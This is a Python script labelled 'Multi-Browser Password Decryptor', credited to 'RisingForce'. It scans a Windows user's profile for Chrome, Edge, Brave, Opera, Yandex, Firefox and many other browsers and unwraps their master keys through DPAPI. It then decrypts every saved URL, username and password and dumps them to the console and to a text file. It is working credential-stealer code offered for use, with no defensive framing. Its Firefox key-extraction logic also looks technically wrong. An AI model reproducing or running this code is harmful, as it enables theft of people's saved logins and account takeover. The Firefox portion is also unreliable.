# multi_browser_decrypt.py - Multi-Browser Password Decryptor
import os
import sys
import json
import base64
import sqlite3
import tempfile
import shutil
import struct
import hashlib
import hmac
import win32crypt
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

class BrowserDecryptor:
    def __init__(self):
        self.results = []
        self.chrome_key = None
        
    # ==================== FIREFOX ====================
    def get_firefox_key(self, key4_path):
        """Extract decryption key from Firefox key4.db"""
        try:
            temp_db = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
            shutil.copy2(key4_path, temp_db.name)
            temp_db.close()
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            
            cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
            row = cursor.fetchone()
            
            if row:
                item1, item2 = row
                try:
                    key = win32crypt.CryptUnprotectData(item1, None, None, None, 0)[1]
                    conn.close()
                    os.unlink(temp_db.name)
                    return key
                except:
                    pass
                
                try:
                    key = win32crypt.CryptUnprotectData(item2, None, None, None, 0)[1]
                    conn.close()
                    os.unlink(temp_db.name)
                    return key
                except:
                    pass
            
            conn.close()
            os.unlink(temp_db.name)
            return None
            
        except Exception as e:
            print(f"[!] Firefox key error: {e}")
            return None
    
    def decrypt_firefox_entry(self, encrypted_data, key):
        """Decrypt a single Firefox entry"""
        try:
            if isinstance(encrypted_data, str):
                if encrypted_data.startswith('~'):
                    encrypted_data = encrypted_data[1:]
                encrypted_bytes = base64.b64decode(encrypted_data)
            else:
                encrypted_bytes = encrypted_data
            
            if len(encrypted_bytes) > 32:
                iv = encrypted_bytes[:16]
                ciphertext = encrypted_bytes[16:]
                
                try:
                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                    decrypted = cipher.decrypt(ciphertext)
                    return decrypted.decode('utf-8', errors='ignore')
                except:
                    pass
            
            try:
                cipher = AES.new(key, AES.MODE_CBC, iv=encrypted_bytes[:16])
                decrypted = cipher.decrypt(encrypted_bytes[16:])
                return unpad(decrypted, AES.block_size).decode('utf-8', errors='ignore')
            except:
                pass
            
            return None
            
        except Exception as e:
            return None
    
    def decrypt_firefox(self, logins_path, key4_path):
        """Decrypt Firefox logins"""
        if not os.path.exists(logins_path) or not os.path.exists(key4_path):
            return []
        
        key = self.get_firefox_key(key4_path)
        if not key:
            return []
        
        try:
            with open(logins_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            logins = data.get('logins', [])
            results = []
            
            for entry in logins:
                url = entry.get('hostname', 'Unknown')
                username_enc = entry.get('encryptedUsername', '')
                password_enc = entry.get('encryptedPassword', '')
                
                username = self.decrypt_firefox_entry(username_enc, key) or "[encrypted]"
                password = self.decrypt_firefox_entry(password_enc, key) or "[encrypted]"
                
                results.append({
                    'url': url,
                    'username': username,
                    'password': password,
                    'browser': 'Firefox'
                })
            
            return results
            
        except Exception as e:
            print(f"[!] Firefox error: {e}")
            return []
    
    # ==================== CHROME/EDGE/BRAVE/OPERA ====================
    def get_chrome_key(self, local_state_path):
        """Get encryption key from Chrome-based browsers"""
        try:
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
            
        except Exception as e:
            print(f"[!] Chrome key error: {e}")
            return None
    
    def decrypt_chrome_password(self, encrypted_value, key):
        """Decrypt Chrome/Edge/Brave password"""
        try:
            if not key:
                return None
            
            # Chrome 80+ uses AES-GCM
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)
                return decrypted[:-16].decode('utf-8', errors='ignore')
            
            # Older Chrome uses DPAPI
            try:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
            except:
                pass
            
            return None
            
        except Exception as e:
            return None
    
    def decrypt_chrome_browser(self, profile_path, browser_name):
        """Decrypt passwords from Chrome-based browser"""
        results = []
        
        # Get key from Local State
        local_state_path = os.path.join(os.path.dirname(profile_path), "Local State")
        key = self.get_chrome_key(local_state_path)
        if not key:
            return results
        
        # Copy Login Data to temp
        login_db = os.path.join(profile_path, "Login Data")
        if not os.path.exists(login_db):
            login_db = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_db):
            return results
        
        try:
            temp_db = tempfile.NamedTemporaryFile(suffix='.db', delete=False)
            shutil.copy2(login_db, temp_db.name)
            temp_db.close()
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            
            for row in rows:
                url = row[0] or "Unknown"
                username = row[1] or ""
                password_enc = row[2]
                
                password = self.decrypt_chrome_password(password_enc, key) or "[encrypted]"
                
                results.append({
                    'url': url,
                    'username': username,
                    'password': password,
                    'browser': browser_name
                })
            
            conn.close()
            os.unlink(temp_db.name)
            
        except Exception as e:
            print(f"[!] {browser_name} error: {e}")
        
        return results
    
    # ==================== FIND BROWSERS ====================
    def find_browsers(self):
        """Find all installed browsers and their paths"""
        browsers = []
        appdata = os.getenv("APPDATA")
        localappdata = os.getenv("LOCALAPPDATA")
        
        # Chrome-based browsers (use Login Data)
        chrome_browsers = [
            (os.path.join(localappdata, "Google", "Chrome", "User Data", "Default"), "Chrome"),
            (os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default"), "Edge"),
            (os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default"), "Brave"),
            (os.path.join(localappdata, "Opera Software", "Opera Stable", "Default"), "Opera"),
            (os.path.join(localappdata, "Opera Software", "Opera GX Stable", "Default"), "Opera GX"),
            (os.path.join(localappdata, "Vivaldi", "User Data", "Default"), "Vivaldi"),
            (os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data", "Default"), "Yandex"),
            (os.path.join(localappdata, "Chromium", "User Data", "Default"), "Chromium"),
            (os.path.join(localappdata, "Amigo", "User Data", "Default"), "Amigo"),
            (os.path.join(localappdata, "Torch", "User Data", "Default"), "Torch"),
            (os.path.join(localappdata, "CentBrowser", "User Data", "Default"), "CentBrowser"),
            (os.path.join(localappdata, "7Star", "7Star", "User Data", "Default"), "7Star"),
            (os.path.join(localappdata, "Sputnik", "Sputnik", "User Data", "Default"), "Sputnik"),
            (os.path.join(localappdata, "Epic Privacy Browser", "User Data", "Default"), "Epic"),
            (os.path.join(localappdata, "uCozMedia", "Uran", "User Data", "Default"), "Uran"),
            (os.path.join(localappdata, "Iridium", "User Data", "Default"), "Iridium"),
        ]
        
        for path, name in chrome_browsers:
            if os.path.exists(path) and os.path.exists(os.path.join(path, "Login Data")):
                browsers.append((path, name))
        
        # Firefox (uses logins.json and key4.db)
        firefox_profiles = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_profiles):
            for profile in os.listdir(firefox_profiles):
                profile_path = os.path.join(firefox_profiles, profile)
                logins_path = os.path.join(profile_path, "logins.json")
                key4_path = os.path.join(profile_path, "key4.db")
                if os.path.exists(logins_path) and os.path.exists(key4_path):
                    browsers.append((profile_path, f"Firefox ({profile})"))
        
        return browsers
    
    def decrypt_all(self):
        """Decrypt passwords from all browsers"""
        print("\n" + "=" * 60)
        print("  SCANNING FOR BROWSERS...")
        print("=" * 60 + "\n")
        
        browsers = self.find_browsers()
        
        if not browsers:
            print("[!] No browsers found!")
            return []
        
        print(f"[+] Found {len(browsers)} browsers\n")
        
        all_results = []
        
        for path, name in browsers:
            print(f"[*] Decrypting {name}...")
            
            if "Firefox" in name:
                logins_path = os.path.join(path, "logins.json")
                key4_path = os.path.join(path, "key4.db")
                results = self.decrypt_firefox(logins_path, key4_path)
            else:
                results = self.decrypt_chrome_browser(path, name)
            
            if results:
                print(f"[+] Found {len(results)} passwords in {name}")
                all_results.extend(results)
            else:
                print(f"[-] No passwords found in {name}")
            
            print()
        
        return all_results
    
    def save_results(self, results, output_file="decrypted_passwords.txt"):
        """Save results to file"""
        if not results:
            print("\n[!] No passwords found!")
            return False
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("=" * 70 + "\n")
                f.write("  MULTI-BROWSER PASSWORD DECRYPTOR\n")
                f.write("  Made by RisingForce\n")
                f.write("=" * 70 + "\n\n")
                
                browsers = {}
                for cred in results:
                    browser = cred.get('browser', 'Unknown')
                    if browser not in browsers:
                        browsers[browser] = []
                    browsers[browser].append(cred)
                
                total = 0
                for browser, creds in browsers.items():
                    f.write(f"\n{'=' * 70}\n")
                    f.write(f"  {browser.upper()} PASSWORDS ({len(creds)})\n")
                    f.write(f"{'=' * 70}\n\n")
                    
                    for i, cred in enumerate(creds, 1):
                        f.write(f"[{i}] URL: {cred['url']}\n")
                        f.write(f"    Username: {cred['username']}\n")
                        f.write(f"    Password: {cred['password']}\n")
                        f.write("-" * 50 + "\n")
                    
                    total += len(creds)
                
                f.write(f"\n{'=' * 70}\n")
                f.write(f"  TOTAL: {total} passwords from {len(browsers)} browsers\n")
                f.write(f"{'=' * 70}\n")
            
            print(f"\n[+] Results saved to: {output_file}")
            return True
            
        except Exception as e:
            print(f"[-] Error saving: {e}")
            return False
    
    def print_results(self, results):
        """Print results to console"""
        if not results:
            print("\n[!] No passwords found!")
            return
        
        print("\n" + "=" * 60)
        print("  DECRYPTED PASSWORDS")
        print("=" * 60 + "\n")
        
        browsers = {}
        for cred in results:
            browser = cred.get('browser', 'Unknown')
            if browser not in browsers:
                browsers[browser] = []
            browsers[browser].append(cred)
        
        for browser, creds in browsers.items():
            print(f"[{browser}] ({len(creds)} passwords)")
            print("-" * 40)
            for i, cred in enumerate(creds[:5], 1):  # Show first 5
                print(f"  {i}. {cred['url']}")
                print(f"     User: {cred['username']}")
                print(f"     Pass: {cred['password']}")
            if len(creds) > 5:
                print(f"  ... and {len(creds) - 5} more")
            print()

def main():
    print("=" * 60)
    print("  MULTI-BROWSER PASSWORD DECRYPTOR")
    print("  Made by RisingForce")
    print("=" * 60)
    
    decryptor = BrowserDecryptor()
    
    # Auto-detect and decrypt all browsers
    print("\n[+] Auto-scanning for browsers...")
    results = decryptor.decrypt_all()
    
    if results:
        decryptor.print_results(results)
        decryptor.save_results(results)
    else:
        print("\n[!] No passwords found.")
        print("\n[!] Try running as Administrator:")
        print("    Right-click PowerShell -> Run as Administrator")
        print("    Then run: python multi_browser_decrypt.py")

if __name__ == "__main__":
    main()